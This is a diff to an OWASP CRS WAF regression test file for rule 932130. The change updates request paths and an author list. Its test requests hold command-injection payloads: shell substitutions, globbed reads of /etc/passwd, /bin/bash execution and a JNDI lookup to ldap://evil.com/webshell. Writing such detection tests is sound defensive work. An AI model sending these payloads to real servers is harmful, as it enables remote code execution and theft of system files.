@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "Paul Beckett, Max Leske"
+  author: "Paul Beckett, Max Leske, azurit"
   enabled: true
   name: "932130.yaml"
   description: "Tests to trigger or not trigger rule 932130"
@@ -16,7 +16,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: "/?932130-1=$(cmd)"
+            uri: "/get?932130-1=$(cmd)"
             protocol: "http"
           output:
             log_contains: 'id "932130"'
@@ -31,6 +31,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: "/post"
             data: "932130-2=${cmd}"
             protocol: "http"
           output:
@@ -47,7 +48,7 @@ tests:
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
               Cookie: "931120-3=<(cmd)"
-            uri: "/"
+            uri: "/get"
             protocol: "http"
           output:
             log_contains: 'id "932130"'
@@ -63,7 +64,7 @@ tests:
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
               Cookie: ">(cmd)=931120-4"
-            uri: "/"
+            uri: "/get"
             protocol: "http"
           output:
             log_contains: 'id "932130"'
@@ -78,6 +79,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: "/post"
             data: "932130-5=Some text (in brackets)."
             protocol: "http"
           output:
@@ -95,7 +97,7 @@ tests:
               Content-Type: application/json
             method: POST
             port: 80
-            uri: /
+            uri: "/post"
             data: '{"foo": "${:1337:-x$}{jndi:ldap://evil.com/webshell}"}'
           output:
             log_contains: 'id "932130"'
@@ -111,7 +113,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
-            uri: "/"
+            uri: "/post"
             data: "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
             version: HTTP/1.0
           output:
@@ -129,7 +131,7 @@ tests:
             method: GET
             port: 80
             # cat /etc/pa[s]swd
-            uri: "/?cmd=cat%20/etc/pa%5Bs%5Dswd"
+            uri: "/get?cmd=cat%20/etc/pa%5Bs%5Dswd"
             version: HTTP/1.0
           output:
             log_contains: id "932130"
@@ -146,7 +148,7 @@ tests:
             method: GET
             port: 80
             # cat /[?]tc/pa[?]swd
-            uri: "/?cmd=cat%20/%5B%3F%5Dtc/pa%5B%3F%5Dswd"
+            uri: "/get?cmd=cat%20/%5B%3F%5Dtc/pa%5B%3F%5Dswd"
             version: HTTP/1.0
           output:
             log_contains: id "932130"
@@ -163,7 +165,7 @@ tests:
             method: GET
             port: 80
             # hello [text in brackets]
-            uri: "/?cmd=hello%20%5Btext%20in%20brackets%5D"
+            uri: "/get?cmd=hello%20%5Btext%20in%20brackets%5D"
             version: HTTP/1.0
           output:
             no_log_contains: id "932130"
@@ -179,7 +181,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: GET
             port: 80
-            uri: "/?s=/etc/pas[s]wd"
+            uri: "/get?s=/etc/pas[s]wd"
             version: HTTP/1.0
           output:
             log_contains: id "932130"
@@ -195,7 +197,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: GET
             port: 80
-            uri: "/?s=/etc/%5Bp%5Dasswd"
+            uri: "/get?s=/etc/%5Bp%5Dasswd"
             version: HTTP/1.0
           output:
             log_contains: id "932130"
@@ -211,7 +213,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: GET
             port: 80
-            uri: "/?s=/etc/%5B!q%5Dasswd"
+            uri: "/get?s=/etc/%5B!q%5Dasswd"
             version: HTTP/1.0
           output:
             log_contains: id "932130"
@@ -227,7 +229,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: GET
             port: 80
-            uri: "/?s=/etc/%5Bm-z%5Dasswd"
+            uri: "/get?s=/etc/%5Bm-z%5Dasswd"
             version: HTTP/1.0
           output:
             log_contains: id "932130"
@@ -243,7 +245,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: GET
             port: 80
-            uri: "/?s=/usr/bin/%5Bu%5Dname+-a"
+            uri: "/get?s=/usr/bin/%5Bu%5Dname+-a"
             version: HTTP/1.0
           output:
             log_contains: id "932130"
@@ -259,7 +261,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: GET
             port: 80
-            uri: "/?exec=/bi%5Bn%5D/bash"
+            uri: "/get?exec=/bi%5Bn%5D/bash"
             version: HTTP/1.0
           output:
             log_contains: id "932130"
